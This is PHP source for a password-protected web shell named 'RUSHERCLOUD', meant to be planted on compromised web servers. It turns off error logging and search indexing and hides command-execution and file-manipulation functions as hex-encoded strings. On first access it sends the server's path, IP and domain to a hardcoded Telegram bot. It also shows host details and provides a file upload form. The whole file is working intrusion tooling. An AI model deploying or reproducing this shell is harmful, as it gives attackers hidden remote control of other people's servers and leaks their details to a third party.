<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
session_start();

// NOTIFY TELEGRAM : START
$hashed_password = '$2y$10$n7OXssNZ0RXYQ.ehxDfjCeema90KbFax4VwOQg6ndtlo2vZxLpska';
$TELEGRAM_BOT_TOKEN = "8266146541:AAF_rizIBOHlBMj-X9Ds9N0owESWfWVKqVo";
$TELEGRAM_CHAT_ID   = "-1003212759603";
$TELEGRAM_TOPIC_ID  = 3;
$session_key_tele = 'notified_' . md5(realpath(__FILE__));

function sendToTelegram($message)
{
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    $data = [
        'chat_id' => $TELEGRAM_CHAT_ID,
        'message_thread_id' => $TELEGRAM_TOPIC_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage";
    @file_get_contents($url . "?" . http_build_query($data));
}

if (!isset($_SESSION[$session_key_tele])) {
    $msg = "<b>RUSHERCLOUD SHELL LOG</b>\n\n";
    $msg .= "Path: <code>" . realpath(__FILE__) . "</code>\n";
    $msg .= "IP: <code>$_SERVER[SERVER_ADDR]</code>\n";
    $msg .= "Domain: <code>$_SERVER[SERVER_NAME]</code>\n";
    $msg .= "First Access: " . date("d-m-Y H:i:s");
    sendToTelegram($msg);
    $_SESSION[$session_key_tele] = true;
}
// NOTIFY TELEGRAM : END

// AUTH : START
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_password)) {
            $_SESSION['logged_in'] = true;
            header('Location: ' . $_SERVER['PHP_SELF'] . $_GET['tmp']);
            exit;
        } else {
            $login_error = "You Wrong Password.";
        }
    }
?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>RUSHER CLOUD</title>
        <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    </head>

    <body>
        <div class="flex justify-center items-center h-max-screen h-screen">
            <div class="h-fit w-3/16">
                <div class="py-10 px-8">
                    <h1 class="mb-10 text-center font-bold text-xl">RUSHERCLOUD</h1>
                    <?php if (isset($login_error)): ?>
                        <div class="alert alert-danger mb-4">
                            <?= htmlspecialchars($login_error); ?>
                        </div>
                    <?php endif; ?>
                    <form method="POST">
                        <input type="password" id="password" name="password" required
                            placeholder="PASSPHRASE" class="w-full mb-8 text-base px-3 py-2 border-[1.5px] border-black rounded-lg shadow-[2.5px_3px_0_#000] focus:outline-none transition ease-in-out duration-250 focus:shadow-[5.5px_7px_0_black]">
                        <button type="submit" class="w-fit text-base px-3 py-2 border-[1.5px] border-black rounded-lg font-semibold cursor-pointer shadow-[2.5px_3px_0_#000] transition ease-in-out duration-250 hover:shadow-[5.5px_7px_0_black] active:translate-y-[2.5px] active:shadow-[0_0_0_#000] bg-gray-200 hover:bg-gray-300">INITIATE SEQUENCE</button>
                    </form>
                </div>
            </div>
        </div>
    </body>

    </html>
<?php
    exit;
}
// AUTH : END

// DETAIL : START
$Array = [
    '676574637764', # getcwd => 0 
    '676c6f62', # glob => 1 
    '69735f646972', # is_dir => 2 
    '69735f66696c65', # is_file => 3 
    '69735f7772697461626c65', # is_writable => 4 
    '69735f7265616461626c65', # is_readable => 5 
    '66696c657065726d73', # fileperms => 6 
    '66696c65', # file => 7 
    '7068705f756e616d65', # php_uname => 8 
    '6765745f63757272656e745f75736572', # get_current_user => 9 
    '68746d6c7370656369616c6368617273', # htmlspecialchars => 10 
    '66696c655f6765745f636f6e74656e7473', # file_get_contents => 11 
    '6d6b646972', # mkdir => 12 
    '746f756368', # touch => 13 
    '6368646972', # chdir => 14 
    '72656e616d65', # rename => 15 
    '65786563', # exec => 16 
    '7061737374687275', # passthru => 17 
    '73797374656d', # system => 18 
    '7368656c6c5f65786563', # shell_exec => 19 
    '706f70656e', # popen => 20 
    '70636c6f7365', # pclose => 21 
    '73747265616d5f6765745f636f6e74656e7473', # stream_get_contents => 22 
    '70726f635f6f70656e', # proc_open => 23 
    '756e6c696e6b', # unlink => 24 
    '726d646972', # rmdir => 25 
    '666f70656e', # fopen => 26 
    '66636c6f7365', # fclose => 27 
    '66696c655f7075745f636f6e74656e7473', # file_put_contents => 28 
    '6d6f76655f75706c6f616465645f66696c65', # move_uploaded_file => 29 
    '63686d6f64', # chmod => 30 
    '7379735f6765745f74656d705f646972', # sys_get_temp_dir => 31 
    '6261736536345F6465636F6465', # => base64_decode => 32 
    '6261736536345F656E636F6465', # => base64_encode => 33 
];
$hitung_array = count($Array);
$fungsi = [];
foreach ($Array as $key => $value) {
    array_push($fungsi, decode_hexa($value));
}

if (isset($_GET['d'])) {
    $chdir = decode_hexa($_GET['d']);
    $fungsi[14]($chdir);
} else {
    $chdir = $fungsi[0]();
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <title>RUSHERCLOUD [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/codemirror.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/xml/xml.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/mode/javascript/javascript.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/show-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/xml-hint.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/codemirror/5.63.0/addon/hint/html-hint.min.js"></script>

</head>

<body class="p-5">
    <div class="menu-header">
        <ul>
            <li class="flex gap-3 items-center align-center font-mono">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#4169e1" class="size-5">
                    <path fill-rule="evenodd" d="M2.25 5.25a3 3 0 0 1 3-3h13.5a3 3 0 0 1 3 3V15a3 3 0 0 1-3 3h-3v.257c0 .597.237 1.17.659 1.591l.621.622a.75.75 0 0 1-.53 1.28h-9a.75.75 0 0 1-.53-1.28l.621-.622a2.25 2.25 0 0 0 .659-1.59V18h-3a3 3 0 0 1-3-3V5.25Zm1.5 0v7.5a1.5 1.5 0 0 0 1.5 1.5h13.5a1.5 1.5 0 0 0 1.5-1.5v-7.5a1.5 1.5 0 0 0-1.5-1.5H5.25a1.5 1.5 0 0 0-1.5 1.5Z" clip-rule="evenodd" />
                </svg>
                &nbsp;<?= $fungsi[8](); ?>
            </li>
            <li class="flex gap-3 items-center align-center font-mono">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#4169e1" class="size-5">
                    <path d="M4.08 5.227A3 3 0 0 1 6.979 3H17.02a3 3 0 0 1 2.9 2.227l2.113 7.926A5.228 5.228 0 0 0 18.75 12H5.25a5.228 5.228 0 0 0-3.284 1.153L4.08 5.227Z" />
                    <path fill-rule="evenodd" d="M5.25 13.5a3.75 3.75 0 1 0 0 7.5h13.5a3.75 3.75 0 1 0 0-7.5H5.25Zm10.5 4.5a.75.75 0 1 0 0-1.5.75.75 0 0 0 0 1.5Zm3.75-.75a.75.75 0 1 1-1.5 0 .75.75 0 0 1 1.5 0Z" clip-rule="evenodd" />
                </svg>
                &nbsp;<?= $_SERVER["SERVER_SOFTWARE"]; ?>
            </li>
            <li class="flex gap-3 items-center align-center font-mono">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#4169e1" class="size-5">
                    <path d="M21.721 12.752a9.711 9.711 0 0 0-.945-5.003 12.754 12.754 0 0 1-4.339 2.708 18.991 18.991 0 0 1-.214 4.772 17.165 17.165 0 0 0 5.498-2.477ZM14.634 15.55a17.324 17.324 0 0 0 .332-4.647c-.952.227-1.945.347-2.966.347-1.021 0-2.014-.12-2.966-.347a17.515 17.515 0 0 0 .332 4.647 17.385 17.385 0 0 0 5.268 0ZM9.772 17.119a18.963 18.963 0 0 0 4.456 0A17.182 17.182 0 0 1 12 21.724a17.18 17.18 0 0 1-2.228-4.605ZM7.777 15.23a18.87 18.87 0 0 1-.214-4.774 12.753 12.753 0 0 1-4.34-2.708 9.711 9.711 0 0 0-.944 5.004 17.165 17.165 0 0 0 5.498 2.477ZM21.356 14.752a9.765 9.765 0 0 1-7.478 6.817 18.64 18.64 0 0 0 1.988-4.718 18.627 18.627 0 0 0 5.49-2.098ZM2.644 14.752c1.682.971 3.53 1.688 5.49 2.099a18.64 18.64 0 0 0 1.988 4.718 9.765 9.765 0 0 1-7.478-6.816ZM13.878 2.43a9.755 9.755 0 0 1 6.116 3.986 11.267 11.267 0 0 1-3.746 2.504 18.63 18.63 0 0 0-2.37-6.49ZM12 2.276a17.152 17.152 0 0 1 2.805 7.121c-.897.23-1.837.353-2.805.353-.968 0-1.908-.122-2.805-.353A17.151 17.151 0 0 1 12 2.276ZM10.122 2.43a18.629 18.629 0 0 0-2.37 6.49 11.266 11.266 0 0 1-3.746-2.504 9.754 9.754 0 0 1 6.116-3.985Z" />
                </svg>
                &nbsp;<?= $_SERVER["SERVER_NAME"]; ?> |&nbsp;<?= $_SERVER["SERVER_ADDR"]; ?>
            </li>
            <li class="flex gap-3 items-center align-center font-mono">
                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="#4169e1" class="size-5">
                    <path fill-rule="evenodd" d="M7.5 6a4.5 4.5 0 1 1 9 0 4.5 4.5 0 0 1-9 0ZM3.751 20.105a8.25 8.25 0 0 1 16.498 0 .75.75 0 0 1-.437.695A18.683 18.683 0 0 1 12 22.5c-2.786 0-5.433-.608-7.812-1.7a.75.75 0 0 1-.437-.695Z" clip-rule="evenodd" />
                </svg>
                &nbsp;<?= $fungsi[9](); ?>
            </li>
            <!-- <li class="logo-gecko"><img width="400" height="200" src="https://raw.githubusercontent.com/angelineuniverse/Cybersecurity/refs/heads/main/rushercloud.png" align="right"></li> -->
            <form action="" method="POST" enctype='<?= "multipart/form-data"; ?>' class="flex gap-3 mt-8">
                <input type="file" name="gecko-upload" class="form-file" />
                <input type="submit" value="Upload" name="gecko-up-submit" class="bg-blue-100 text-blue-700 font-sm font-mono cursor-pointer px-3 py-1 rounded-md hover:bg-blue-400" />
            </form>
            <li><a href="?logout" class="btn-submit"><i class="fa-solid fa-close"></i>Logout</a></li>
        </ul>
    </div>
</body>

</html>
<?php

function decode_hexa($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}
?>